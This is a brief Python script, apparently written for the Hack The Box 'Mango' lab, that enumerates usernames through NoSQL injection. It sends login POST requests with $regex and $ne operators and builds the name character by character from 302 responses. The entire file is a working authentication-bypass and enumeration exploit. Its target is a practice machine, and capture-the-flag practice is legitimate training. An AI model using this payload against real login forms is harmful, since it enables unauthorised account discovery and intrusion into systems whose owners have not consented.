#!/usr/bin/python3

#nosql user enumeration with POST method - used for HTB(mango)
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username=""
password=""
u="http://staging-order.mango.htb"
headers={'content-type': 'Application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c.isalnum(): # and c not in ['a']: #if c not in ['*','+','.','?','|', '&']:
            payload='username[$regex]=^%s&password[$ne]=%s&login=login' % (username + c, password)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302:
                print("Found one more char : %s" % (username+c))
                username += c
